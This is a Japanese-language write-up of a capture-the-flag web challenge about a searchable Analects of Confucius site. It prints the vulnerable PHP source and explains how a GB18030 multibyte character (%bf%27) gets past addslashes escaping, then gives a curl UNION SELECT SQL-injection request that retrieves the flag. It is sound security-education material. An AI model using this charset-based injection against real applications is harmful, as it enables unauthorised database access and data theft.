# analects:web:XXXXpts
confucius was a cool guy I think he said some things  
[analects.tjc.tf](https://analects.tjc.tf/)  

Downloads  
[server.zip](server.zip)  

# Solution
サイトとソースが渡される。  
Analects of Confucius  
[site.png](site/site.png)  
論語の検索サイトのようだ。  
ソースを見るとphpは以下のようであった。  
```php
<?php

  mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);

  function search() {
    $ret = [];

    if (!isset($_GET["q"])) {
      return $ret;
    }

    $db = new mysqli("p:mysql", "app", "07b05ee6779745b258ef8dde529940012b72ba3a007c7d40a83f83f0938b5bf0", "analects");

    $query = addslashes($_GET["q"]);
    $sql = "SELECT * FROM analects WHERE chinese LIKE '%{$query}%' OR english LIKE '%{$query}%'";
    $result = $db->query($sql);

    while ($row = $result->fetch_assoc()) {
      $row["chinese"] = mb_convert_encoding($row["chinese"], "UTF-8", "GB18030");
      $row["english"] = mb_convert_encoding($row["english"], "UTF-8", "GB18030");
      array_push($ret, $row);
    }
    $result->free_result();

    return $ret;
  }

  header('Content-Type: application/json; charset=UTF-8');
  echo json_encode(search());
?>
```
SQLiが可能かと疑うが、`addslashes`に通っており安全に見える。  
ここで、GB18030という文字コードが使われていることに注目する。  
配布された1-dump.sqlにも`CHARSET=gb18030`とされている。  
よく知られている`addslashes`の文字コードを利用したSQLiである。  
入力として`%bf%27`を考えると`'`(`%27`)をエスケープするため`\'`(`%5c%27`)へ置換する。  
全体として`%bf%5c%27`となるが、先頭の`%bf%5c`が中国語のマルチバイト文字と解釈され、サニタイズに失敗する。  
これによりSQLiが可能となったので、ソースの3-flag.shよりわかるflagを取得すればよい。  
```bash
$ curl "https://analects.tjc.tf/search.php?q=%bf%27%20UNION%20SELECT%201,%201,%201,%201,%201,%20flag%20FROM%20flag%20--%20satoki"
[{"id":"1","book":"1","chapter":"1","number":"1","chinese":"1","english":"tjctf{h0w_t0_h4v3_go0d_mor4l5??}"}]
```
flagが得られた。  

## tjctf{h0w_t0_h4v3_go0d_mor4l5??}